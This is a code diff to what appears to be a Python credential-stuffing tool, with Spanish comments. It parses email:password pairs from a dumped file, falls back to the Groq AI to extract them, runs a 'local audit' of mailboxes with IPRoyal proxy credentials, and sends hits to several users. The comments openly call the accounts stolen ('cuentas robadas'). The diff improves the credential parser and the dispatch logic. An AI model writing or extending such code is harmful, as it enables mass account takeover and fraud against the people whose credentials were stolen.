@@ -703,7 +703,8 @@ def run_local_audit(email, password, iproyal_auth, hits_buffer, keyword="", user
             # Multi-Tenant Dispatch Protocol
             for cid, u_senders in user_targets_dict.items():
                 u_found = {a: c for a, c in senders_found.items() if a in u_senders}
-                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos
+                # Solo notificar al usuario si la cuenta SÍ tiene al menos un remitente de los suyos, 
+                # O si el usuario simplemente quiere recibir TODAS las cuentas robadas (lista de senders vacía, aunque aquí exigimos que guarden al menos 1 para aislar)
                 if not u_found and len(u_senders) > 0:
                     continue # El usuario no encontraría nada de lo suyo aquí
                 
@@ -750,15 +751,18 @@ def process_file_and_scan(file_path, keyword=""):
         print(f"❌ Error leyendo archivo: {e}")
         return
         
-    raw_pairs = [line.strip() for line in creds_text.split('\n') if line.strip()]
+    # Intento 1: Regex robusto local para no depender de la IA si la cuota falla
     valid_creds = []
-    for pair in raw_pairs:
-        parts = pair.split(':')
-        if len(parts) >= 2 and '@' in parts[0]:
-            valid_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
+    import re
+    matches = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*(\S+)', creds_text)
+    for email_match, pass_match in matches:
+        valid_creds.append(f"{email_match.strip()}:{pass_match.strip()}")
+        
+    # Deduplicar
+    valid_creds = list(dict.fromkeys(valid_creds))
             
-    if len(valid_creds) < 3:
-        print("⚠️ Formato de archivo complejo detectado. El parser rápido falló.")
+    if not valid_creds:
+        print("⚠️ Parser local estricto falló. Archivo demasiado sucio. Cayendo a Groq AI...")
         ai_creds = extract_with_groq(creds_text)
         
         if not ai_creds:
